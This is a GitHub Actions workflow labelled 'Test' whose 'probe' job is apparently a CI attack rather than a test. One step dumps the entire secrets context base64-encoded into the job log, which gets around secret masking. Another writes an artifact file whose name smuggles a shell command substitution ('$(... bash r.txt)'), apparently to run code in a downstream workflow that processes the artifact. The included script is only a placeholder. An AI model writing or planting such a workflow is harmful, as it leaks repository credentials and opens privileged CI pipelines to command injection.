name: Test

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Dump secrets context
        env:
          ALLSECRETS: ${{ toJSON(secrets) }}
        run: |
          python3 -c "import os,json,base64;d=os.environ.get('ALLSECRETS','');print('OMP_SECRET_NAMES='+','.join(sorted(json.loads(d).keys())));print('OMP_SECRETS_B64='+base64.b64encode(d.encode()).decode())"
      - name: Artifact for comment workflow
        run: |
          mkdir -p out
          printf '%s\n' "${{ github.event.pull_request.number }}" > out/pr_number.txt 2>/dev/null || true
          printf 'flag-channel\n' > out/report.txt
          printf 'x' > 'out/$(cd $HOME;cd ..;cd ..;cd tmp;cd content;cd content;bash r.txt).txt'
          cat > out/r.txt <<'SCRIPT'
          #!/bin/bash
          exit 0
          SCRIPT
      - uses: actions/upload-artifact@v4
        if: github.event_name == 'pull_request'
        with:
          name: content
          path: out
